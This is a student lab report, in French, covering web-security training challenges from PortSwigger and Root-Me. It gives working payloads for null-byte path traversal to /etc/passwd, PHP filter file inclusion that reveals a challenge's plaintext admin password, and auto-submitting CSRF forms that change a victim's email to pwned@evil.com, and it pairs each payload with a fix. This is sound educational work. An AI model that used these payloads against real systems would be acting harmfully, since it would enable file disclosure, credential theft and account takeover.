# TP Sécurité Web — hallenges

**Membres du groupe :** GUEPPOIS Karen· MOUKOKO NDONGO Victoire Dane

---

## Partie 2 — Challenges

---

### Challenge 1 — File Path Traversal : Null Byte Bypass

**URL :** https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

#### Comment on a trouvé la vulnérabilité

En ouvrant le lab, on remarque que les images produit se chargent via un paramètre `filename` dans l'URL. On a activé l'intercept dans Burp pour capturer la requête :

```
GET /image?filename=53.jpg HTTP/2
```

On a envoyé ça dans le Repeater et essayé de sortir du dossier images en faisant une traversée classique avec `../../../etc/passwd` — le serveur refuse parce qu'il vérifie que le fichier demandé se termine par une extension image.

L'astuce : le **null byte** (`%00`). En C et dans beaucoup d'implémentations, ce caractère marque la fin d'une chaîne. Donc si on envoie `../../../etc/passwd%00.jpg`, le serveur lit `.jpg` à la fin et valide, mais quand il ouvre réellement le fichier, le système s'arrête au `%00` et ouvre `/etc/passwd`.

#### Payload

```
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: <lab-id>.web-security-academy.net
```

La réponse contient tout le fichier `/etc/passwd` avec la liste des utilisateurs du système.

#### Screenshot
<img width="959" height="683" alt="c1" src="https://github.com/user-attachments/assets/3a64f92a-a82a-451f-9105-e255386d0d20" />


#### Comment corriger ça

La bonne pratique c'est de ne jamais laisser l'utilisateur choisir un chemin de fichier directement. À la place, on peut utiliser une map statique côté serveur (id → nom de fichier) et construire le chemin en interne. Si on doit quand même accepter un nom de fichier, il faut résoudre le chemin absolu avec `realpath()` et vérifier qu'il reste bien dans le dossier autorisé. Tout caractère suspect (`../`, `%00`, `%2e%2e`) doit être bloqué dès l'entrée.

**Référence :** https://portswigger.net/web-security/file-path-traversal

---

### Challenge 2 — PHP Filters (LFI)

**URL :** https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

#### Comment on a trouvé la vulnérabilité

En arrivant sur le challenge, on voit que les pages se chargent via un paramètre `?inc=` dans l'URL (`?inc=accueil.php`, `?inc=login.php`). C'est typiquement le genre de paramètre vulnérable à une inclusion de fichier local.

Si on essaie d'inclure directement un fichier PHP, le serveur l'exécute et on ne voit pas son contenu. Le wrapper `php://filter` de PHP permet de contourner ça en lisant le fichier encodé en base64 avant exécution. On a tenté avec `resource=login.php` mais nginx bloque les `.php`. En encodant le point en `%2e`, on contourne ce filtre.

On a lu `login.php` → son code source montre qu'il inclut `config.php`. On a lu `config.php` de la même façon → credentials en clair.

Toutes les requêtes ont été faites dans Burp Repeater, et le décodage base64 dans le terminal.

#### Payload

```
GET /web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config%2ephp HTTP/1.1
Host: challenge01.root-me.org
```

Décodage dans le terminal :

```bash
echo "PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK" | base64 -d
```

Résultat :

```php
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

#### Screenshots

Burp Repeater avec la réponse base64 :

<img width="959" height="665" alt="s3" src="https://github.com/user-attachments/assets/c71457e4-7dfc-45b6-a11c-ab2baf9e4066" />


Décodage dans le terminal :

<img width="553" height="439" alt="s4" src="https://github.com/user-attachments/assets/2fb7c39f-c4a4-490a-aef6-9ee291e97e64" />


Page après connexion avec les credentials trouvés :

<img width="359" height="215" alt="s7" src="https://github.com/user-attachments/assets/cfc2aad6-430c-4ada-b5b5-163f0482c827" />
<img width="1216" height="622" alt="s5" src="https://github.com/user-attachments/assets/e5523695-6cb4-48ee-9a40-e444560aa72a" />


#### Comment corriger ça

Il ne faut jamais passer une entrée utilisateur directement dans `include()`. La solution propre c'est une liste blanche de pages autorisées :

```php
$pages = ['home' => 'accueil.php', 'login' => 'login.php'];
$file = $pages[$_GET['inc']] ?? 'accueil.php';
include($file);
```

Côté configuration PHP, désactiver `allow_url_include` dans `php.ini`. Et ne jamais stocker des mots de passe en clair dans des fichiers — utiliser des variables d'environnement ou un gestionnaire de secrets. Enfin, couper les messages d'erreur en production (`display_errors = Off`) car notre erreur `Warning: include(...)` nous a donné le chemin absolu du serveur.

**Référence :** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

---

### Challenge 4 — CSRF : Token non lié à la session

**URL :** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

#### Comment on a trouvé la vulnérabilité

Le lab met à disposition deux comptes : `wiener/peter` et `carlos/montoya`. On s'est connecté en wiener et on a récupéré le token CSRF de la page "My account" sans soumettre le formulaire — le token reste donc valide côté serveur.

La vulnérabilité : ce token est valide pour n'importe quelle session, pas uniquement celle de wiener. Du coup, si on forge un formulaire CSRF avec ce token et qu'on le fait soumettre par la victime (via le bouton "Deliver to victim" de l'exploit server intégré au lab), le serveur l'accepte.

#### Payload

```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
      <input type="hidden" name="csrf" value="REVNkbUeQx8A4RABe96zEvTbfzI5MgSb" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

#### Screenshot

<img width="1132" height="299" alt="S9" src="https://github.com/user-attachments/assets/3506f05e-b29a-4c34-898e-67547d62ec57" />


#### Comment corriger ça

Le token CSRF doit absolument être lié à la session côté serveur. À chaque requête POST sensible, le back-end doit vérifier que le token reçu correspond bien au token associé à la session active. Les tokens doivent aussi être à usage unique — invalidés dès qu'ils ont été utilisés une fois.

**Référence :** https://portswigger.net/web-security/csrf/bypassing-token-validation

---

### Challenge 5 — CSRF : Validation du Referer dépendante de sa présence

**URL :** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

#### Comment on a trouvé la vulnérabilité

En testant dans Burp Repeater, on a modifié le header `Referer` de la requête POST pour mettre un domaine externe → le serveur répond `400 "Invalid referer header"`. Jusque là, la protection semble fonctionner.

Mais en supprimant complètement le header `Referer`, le serveur répond normalement sans le bloquer. Il ne vérifie le Referer que s'il est présent — s'il est absent, il laisse passer. Il suffit alors d'ajouter une balise meta sur notre page malveillante pour que le navigateur ne transmette pas ce header.

#### Payload

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

#### Screenshot

<img width="1132" height="299" alt="s10" src="https://github.com/user-attachments/assets/c3f865cf-9897-4aaa-b0e3-70d3de61a83e" />


#### Comment corriger ça

Ne pas baser une protection CSRF uniquement sur le Referer — c'est un header trop facilement contournable ou absent. Si on veut quand même vérifier l'origine de la requête, mieux vaut utiliser le header `Origin` qui ne peut pas être supprimé par `Referrer-Policy`. Dans tous les cas, la vraie protection reste un token CSRF lié à la session, couplé à `SameSite=Strict` sur les cookies.

**Référence :** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses

---

